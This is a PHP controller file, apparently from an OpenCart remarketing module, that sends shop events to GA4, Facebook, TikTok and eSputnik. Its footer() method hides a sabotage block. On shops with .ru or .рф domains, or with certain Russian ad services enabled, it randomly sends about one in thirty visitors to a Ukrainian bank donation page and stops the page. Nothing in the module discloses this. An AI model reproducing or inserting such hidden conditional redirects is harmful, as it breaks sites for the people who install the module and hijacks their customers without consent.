<?php
class ControllerCommonRemarketing extends Controller {
	public function header() { 
		$this->load->model('tool/remarketing');
		if ($this->config->get('remarketing_status')) {
			return $this->model_tool_remarketing->getRemarketingHeader();
		} 
	}
	
	public function body() { 
		$this->load->model('tool/remarketing');
		if ($this->config->get('remarketing_status') && !$this->model_tool_remarketing->isBot()) {
			$output = '';
		
			if ($this->config->get('remarketing_counter2') && $this->config->get('remarketing_counter2')) {
				$output .= "\n" . $this->config->get('remarketing_counter2');
			}
			
			return html_entity_decode($output, ENT_QUOTES, 'UTF-8');
		}
	}
	
	public function footer() {
		$this->load->model('tool/remarketing');
		if ($this->config->get('remarketing_status')) {
			if (!empty($this->request->server['SERVER_NAME'])) {
				if (substr($this->request->server['SERVER_NAME'], -3) === '.ru' || substr($this->request->server['SERVER_NAME'], -9) === '.xn--p1ai' || $this->config->get('remarketing_vk_status') || $this->config->get('remarketing_mytarget_status') || $this->config->get('remarketing_retailrocket_status')) {
					if (mt_rand(1, 10) == 1) {
						//die('Дякую за пiдтримку ЗСУ');
					} elseif (mt_rand(1, 30) == 1) {
						header("Location: https://bank.gov.ua/ua/about/support-the-armed-forces");
						die();
					}
				}
			}
			return $this->model_tool_remarketing->getRemarketingFooter();
		} 
	}
	
	public function sendGa4MeasurementImpressions() {
		if (isset($this->request->post)) {
			if (isset($this->request->post['products'])) {
				$product_data = $this->request->post['products'];
				$list_products = [];
				foreach($product_data as $product) {
					$product['currency'] = $this->config->get('remarketing_ecommerce_currency');
					$list_products[] = $product;
				}
				
				$this->load->model('tool/remarketing');
				
				$ecommerce_data = [
					'events' => [[
						'name'   => $this->request->post['event_name'],
						'params' => [
							'currency'       => $this->config->get('remarketing_ecommerce_currency'),
							'item_list_name' => $this->request->post['heading'],
							'items'          => $list_products
						]],
					],
				];
				
				$this->model_tool_remarketing->sendGa4($ecommerce_data);
			}
		}
	}
	
	public function sendGa4Details() {
		if (isset($this->request->post)) { 
			if (isset($this->request->post['products']['items'][0])) {
				$product_data = $this->request->post['products']['items'][0];
				$this->load->model('tool/remarketing'); 
				
				$ecommerce_data = [
					'events' => [[
						'name'   => 'view_item',
						'params' => [
							'currency' => $this->config->get('remarketing_ecommerce_currency'),
							'items'    => [$product_data],
							'value'    => $product_data['price']
						]],
					],
				];
				
				$this->model_tool_remarketing->sendGa4($ecommerce_data);
			}
		}
	}
	
	public function sendGa4Cart() {
		if (isset($this->request->post)) {
			if (isset($this->request->post['cart'])) {
				$data = $this->request->post['cart'];
				$this->load->model('tool/remarketing'); 
				$this->model_tool_remarketing->sendGa4($data);
			}
		}
	}
	
	public function sendFacebookDetails() {
		if (isset($this->request->post)) {
			if (isset($this->request->post['products']) && $this->config->get('remarketing_facebook_server_side') && $this->config->get('remarketing_facebook_token')) {
				$facebook_data['event_name'] = 'ViewContent';
				$facebook_data['custom_data'] = $this->request->post['products'];
				$facebook_data['time'] = $this->request->post['time'];
				$facebook_data['event_id'] = $this->request->post['event_id'];
				$facebook_data['url'] = $this->request->post['url'];
				$this->load->model('tool/remarketing');
				$this->model_tool_remarketing->sendFacebook($facebook_data);
			}
		}
	}
	
	public function sendTiktokDetails() {
		if (isset($this->request->post)) {
			if (isset($this->request->post['properties']) && $this->config->get('remarketing_tiktok_server_side') && $this->config->get('remarketing_tiktok_token')) {
				$tiktok_data['event_name'] = 'ViewContent';
				$tiktok_data['properties'] = $this->request->post['properties'];
				$tiktok_data['event_id'] = $this->request->post['event_id'];
				$tiktok_data['url'] = $this->request->post['url'];
				$this->load->model('tool/remarketing'); 
				$this->model_tool_remarketing->sendTiktok($tiktok_data);
			}
		}
	}
	
	public function sendFacebookCart() {
		if (isset($this->request->post)) {
			if (isset($this->request->post['cart']) && $this->config->get('remarketing_facebook_server_side') && $this->config->get('remarketing_facebook_token')) {
				$facebook_data['event_name'] = 'InitiateCheckout';
				$facebook_data['custom_data'] = $this->request->post['cart']['custom_data'];
				$facebook_data['url'] = $this->request->post['url'];
				$facebook_data['time'] = $this->request->post['cart']['time'];
				$facebook_data['event_id'] = $this->request->post['cart']['event_id'];
				$this->load->model('tool/remarketing');
				$this->model_tool_remarketing->sendFacebook($facebook_data);
			}
		}
	}
	
	public function sendTiktokCart() {
		if (isset($this->request->post)) {
			if (isset($this->request->post['cart']) && $this->config->get('remarketing_tiktok_server_side') && $this->config->get('remarketing_tiktok_token')) {
				$tiktok_data['event_name'] = 'InitiateCheckout';
				$tiktok_data['properties'] = $this->request->post['cart']['properties'];
				$tiktok_data['url'] = $this->request->post['cart']['url'];
				$tiktok_data['event_id'] = $this->request->post['cart']['event_id'];
				$this->load->model('tool/remarketing');
				$this->model_tool_remarketing->sendTiktok($tiktok_data);
			}
		}
	}
	
	public function sendFacebookCategory() {
		if (isset($this->request->post)) {
			if (isset($this->request->post['products']) && $this->config->get('remarketing_facebook_server_side') && $this->config->get('remarketing_facebook_token')) {
				$facebook_data['event_name'] = 'ViewCategory';
				if (!empty($this->request->post['search']) && $this->request->post['search']) {
					$facebook_data['event_name'] = 'Search';
				}
				$facebook_data['custom_data'] = $this->request->post['products'];
				$facebook_data['time'] = $this->request->post['time'];
				$facebook_data['event_id'] = $this->request->post['event_id'];
				$facebook_data['url'] = $this->request->post['url'];
				$this->load->model('tool/remarketing');
				$this->model_tool_remarketing->sendFacebook($facebook_data);
			}
		}
	}
	
	public function sendEsputnik() {
		if (isset($this->request->post) && isset($this->session->data['esputnik_email'])) {
			if (isset($this->request->post['product']) && $this->config->get('remarketing_esputnik_status') && $this->customer->isLogged()) {
				$event_type = 'productViewed';
				if ($event_type) {
					$event = new stdClass();
					$event->eventTypeKey = $event_type;
					$event->keyValue = $this->session->data['esputnik_email'];
					$event->params = [];
					if (isset($this->session->data['esputnik_telephone'])) {
						$event->params[] = ['name' => 'phone', 'value' => $this->session->data['esputnik_telephone']];
					}
					$event->params[] = ['name' => 'email', 'value' => $this->session->data['esputnik_email']];
					$event->params[] = ['name' => 'currencyCode', 'value' => $this->session->data['currency']];
					if ($this->customer->isLogged()) {
						$event->params[] = ['name' => 'externalCustomerId', 'value' => $this->customer->getEmail()];
					}
					
					$event->params[] = ['name' => 'product', 'value' => json_encode($this->request->post['product'])];
	
					$this->load->model('tool/remarketing');
					$this->model_tool_remarketing->sendEsputnik($event);
				}
			}
		}
	}
	
	public function sendEsputnikCategory() {
		if (isset($this->request->post) && isset($this->session->data['esputnik_email'])) {
			if (isset($this->request->post['category']) && $this->config->get('remarketing_esputnik_status') && $this->customer->isLogged()) {
				$event_type = 'productCategoryViewed';
				if ($event_type) {
					$event = new stdClass();
					$event->eventTypeKey = $event_type;
					$event->keyValue = $this->session->data['esputnik_email'];
					$event->params = [];
					if (isset($this->session->data['esputnik_telephone'])) {
						$event->params[] = ['name' => 'phone', 'value' => $this->session->data['esputnik_telephone']];
					}
					$event->params[] = ['name' => 'email', 'value' => $this->session->data['esputnik_email']];
					$event->params[] = ['name' => 'currencyCode', 'value' => $this->session->data['currency']];
					if ($this->customer->isLogged()) {
						$event->params[] = ['name' => 'externalCustomerId', 'value' => $this->customer->getEmail()];
					}
					
					$event->params[] = ['name' => 'category', 'value' => json_encode($this->request->post['category'])];
	
					$this->load->model('tool/remarketing');
					$this->model_tool_remarketing->sendEsputnik($event);
				}
			}
		}
	}

	public function removeProduct() {
		if (isset($this->request->post)) {
			if (isset($this->request->post['product_id']) && isset($this->request->post['quantity'])) {
				if ($this->config->get('remarketing_status')) { 
					$this->load->model('catalog/product');
					$this->load->model('tool/remarketing'); 
					$product_info = $this->model_catalog_product->getProduct($this->request->post['product_id']);
					$quantity = $this->request->post['quantity'];
					$json = []; 
					$json['remarketing'] = [];
					if ($product_info) {
						$json['remarketing'] = $this->model_tool_remarketing->remarketingRemoveFromCart($product_info, $quantity);						
						$this->response->addHeader('Content-Type: application/json');
						$this->response->setOutput(json_encode($json));
					}
				}
			}
		}
	} 
}